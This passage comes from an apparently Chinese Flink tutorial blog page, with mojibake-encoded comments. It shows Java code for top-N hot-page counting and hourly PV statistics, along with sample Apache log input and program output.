accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„çª—å£å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String url, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(url, window.getEnd(), input.iterator().next()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å¤„ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopNHotPages</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer topSize;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotPages</span><span class="params">(Integer topSize)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.topSize = topSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼Œä¿å­˜å½“å‰æ‰€æœ‰PageViewCountåˆ°Mapä¸­</span></span><br><span class="line">    <span class="comment">//        ListState&lt;PageViewCount&gt; pageViewCountListState;</span></span><br><span class="line">    MapState&lt;String, Long&gt; pageViewCountMapState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">//            pageViewCountListState = getRuntimeContext().getListState(new ListStateDescriptor&lt;PageViewCount&gt;(&quot;page-count-list&quot;, PageViewCount.class));</span></span><br><span class="line">      pageViewCountMapState = getRuntimeContext().getMapState(<span class="keyword">new</span> MapStateDescriptor&lt;String, Long&gt;(<span class="string">&quot;page-count-map&quot;</span>, String.class, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(PageViewCount value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">//            pageViewCountListState.add(value);</span></span><br><span class="line">      pageViewCountMapState.put(value.getUrl(), value.getCount());</span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// æ³¨å†Œä¸€ä¸ª1åˆ†é’Ÿä¹‹åçš„å®šæ—¶å™¨ï¼Œç”¨æ¥æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">60</span> * <span class="number">1000L</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å…ˆåˆ¤æ–­æ˜¯å¦åˆ°äº†çª—å£å…³é—­æ¸…ç†æ—¶é—´ï¼Œå¦‚æœæ˜¯ï¼Œç›´æ¥æ¸…ç©ºçŠ¶æ€è¿”å›</span></span><br><span class="line">      <span class="keyword">if</span> (timestamp == ctx.getCurrentKey() + <span class="number">60</span> * <span class="number">1000L</span>) &#123;</span><br><span class="line">        pageViewCountMapState.clear();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//            ArrayList&lt;PageViewCount&gt; pageViewCounts = Lists.newArrayList(pageViewCountListState.get().iterator());</span></span><br><span class="line">      ArrayList&lt;Map.Entry&lt;String, Long&gt;&gt; pageViewCounts = Lists.newArrayList(pageViewCountMapState.entries().iterator());</span><br><span class="line"></span><br><span class="line">      pageViewCounts.sort((a, b) -&gt; -Long.compare(a.getValue(), b.getValue()));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ ¼å¼åŒ–æˆStringè¾“å‡º</span></span><br><span class="line">      StringBuilder resultBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;çª—å£ç»“æŸæ—¶é—´ï¼š&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// éå†åˆ—è¡¨ï¼Œå–top nè¾“å‡º</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(topSize, pageViewCounts.size()); i++) &#123;</span><br><span class="line">        <span class="comment">//                PageViewCount pageViewCount = pageViewCounts.get(i);</span></span><br><span class="line">        Map.Entry&lt;String, Long&gt; pageViewCount = pageViewCounts.get(i);</span><br><span class="line">        resultBuilder.append(<span class="string">&quot;NO &quot;</span>).append(i + <span class="number">1</span>).append(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          .append(<span class="string">&quot; é¡µé¢URL = &quot;</span>).append(pageViewCount.getKey())</span><br><span class="line">          .append(<span class="string">&quot; æµè§ˆé‡ = &quot;</span>).append(pageViewCount.getValue())</span><br><span class="line">          .append(System.lineSeparator());</span><br><span class="line">      &#125;</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;===============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ§åˆ¶è¾“å‡ºé¢‘ç‡</span></span><br><span class="line">      Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">      out.collect(resultBuilder.toString());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//            pageViewCountListState.clear();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å…¥  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">83.149.9.216 - - 17/05/2015:10:25:49 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:50 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:51 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:52 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:55 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:56 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:56 +0000 GET /present</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:57 +0000 GET /present</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:01 +0000 GET /</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:02 +0000 GET /pre</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:46 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:03 +0000 GET /pre</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829549000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829550000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829551000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829552000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829555000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829556000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829556000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/present&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829557000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/present&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829561000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829562000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/pre&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829546000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829550000, count=2&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829555000, count=5&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829560000, count=7&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/present&#x27;</span>, windowEnd=1431829560000, count=2&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829563000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/pre&#x27;</span>&#125;</span></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:25:50.0</span><br><span class="line">NO 1: é¡µé¢URL = /presentations/ æµè§ˆé‡ = 2</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:25:55.0</span><br><span class="line">NO 1: é¡µé¢URL = /presentations/ æµè§ˆé‡ = 5</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:26:00.0</span><br><span class="line">NO 1: é¡µé¢URL = /presentations/ æµè§ˆé‡ = 7</span><br><span class="line">NO 2: é¡µé¢URL = /present æµè§ˆé‡ = 2</span><br><span class="line">===============================</span><br></pre></td></tr></table></figure></li></ul><h5 id="å®æ—¶æµé‡ç»Ÿè®¡â€”â€”PVå’ŒUV"><a href="#å®æ—¶æµé‡ç»Ÿè®¡â€”â€”PVå’ŒUV" class="headerlink" title="å®æ—¶æµé‡ç»Ÿè®¡â€”â€”PVå’ŒUV"></a>å®æ—¶æµé‡ç»Ÿè®¡â€”â€”PVå’ŒUV</h5><ul><li>åŸºæœ¬éœ€æ±‚ <ul><li>ä»åŸ‹ç‚¹æ—¥å¿—ä¸­ï¼Œç»Ÿè®¡å®æ—¶çš„PVå’ŒUV</li><li>ç»Ÿè®¡æ¯å°æ—¶çš„è®¿é—®é‡ï¼ˆPVï¼‰ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·è¿›è¡Œå»é‡ï¼ˆUVï¼‰</li></ul></li><li>è§£å†³æ€è·¯ <ul><li>ç»Ÿè®¡åŸ‹ç‚¹æ—¥å¿—ä¸­çš„pvè¡Œä¸ºï¼Œåˆ©ç”¨Setæ•°æ®ç»“æ„è¿›è¡Œå»é‡</li><li><strong>å¯¹äºè¶…å¤§è§„æ¨¡çš„æ•°æ®ï¼Œå¯ä»¥è€ƒè™‘ç”¨å¸ƒéš†è¿‡æ»¤å™¨è¿›è¡Œå»é‡</strong></li></ul></li></ul><h6 id="ä»£ç 1-PVç»Ÿè®¡-åŸºæœ¬å®ç°"><a href="#ä»£ç 1-PVç»Ÿè®¡-åŸºæœ¬å®ç°" class="headerlink" title="ä»£ç 1-PVç»Ÿè®¡-åŸºæœ¬å®ç°"></a>ä»£ç 1-PVç»Ÿè®¡-åŸºæœ¬å®ç°</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 3:11 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageView</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä»csvæ–‡ä»¶ä¸­è·å–æ•°æ®</span></span><br><span class="line">    URL resource = PageView.class.getResource(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO,åˆ†é…æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; userBehaviorDataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. åˆ†ç»„å¼€çª—èšåˆï¼Œå¾—åˆ°æ¯ä¸ªçª—å£å†…å„ä¸ªå•†å“çš„countå€¼</span></span><br><span class="line">    DataStream&lt;Tuple2&lt;String, Long&gt;&gt; pvResultStream = userBehaviorDataStream</span><br><span class="line">      <span class="comment">// è¿‡æ»¤åªä¿ç•™pvè¡Œä¸º</span></span><br><span class="line">      .filter(userBehavior -&gt; <span class="string">&quot;pv&quot;</span>.equals(userBehavior.getBehavior()))</span><br><span class="line">      .map(<span class="keyword">new</span> MapFunction&lt;UserBehavior, Tuple2&lt;String, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Long&gt; <span class="title">map</span><span class="params">(UserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="string">&quot;pv&quot;</span>, <span class="number">1L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// æŒ‰ç…§å•†å“IDåˆ†ç»„</span></span><br><span class="line">      .keyBy(item -&gt; item.f0)</span><br><span class="line">      <span class="comment">// 1å°æ—¶æ»šåŠ¨çª—å£</span></span><br><span class="line">      .window(TumblingEventTimeWindows.of(Time.hours(<span class="number">1</span>)))</span><br><span class="line">      .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pvResultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;pv count job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(pv,41890)</span><br><span class="line">(pv,48022)</span><br><span class="line">(pv,47298)</span><br><span class="line">(pv,44499)</span><br><span class="line">(pv,48649)</span><br><span class="line">(pv,50838)</span><br><span class="line">(pv,52296)</span><br><span class="line">(pv,52552)</span><br><span class="line">(pv,48292)</span><br><span class="line">(pv,13)</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 2-PVç»Ÿè®¡-å¹¶è¡Œå’Œæ•°æ®å€¾æ–œä¼˜åŒ–"><a href="#ä»£ç 2-PVç»Ÿè®¡-å¹¶è¡Œå’Œæ•°æ®å€¾æ–œä¼˜åŒ–" class="headerlink" title="ä»£ç 2 PVç»Ÿè®¡-å¹¶è¡Œå’Œæ•°æ®å€¾æ–œä¼˜åŒ–"></a>ä»£ç 2 PVç»Ÿè®¡-å¹¶è¡Œå’Œæ•°æ®å€¾æ–œä¼˜åŒ–</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> 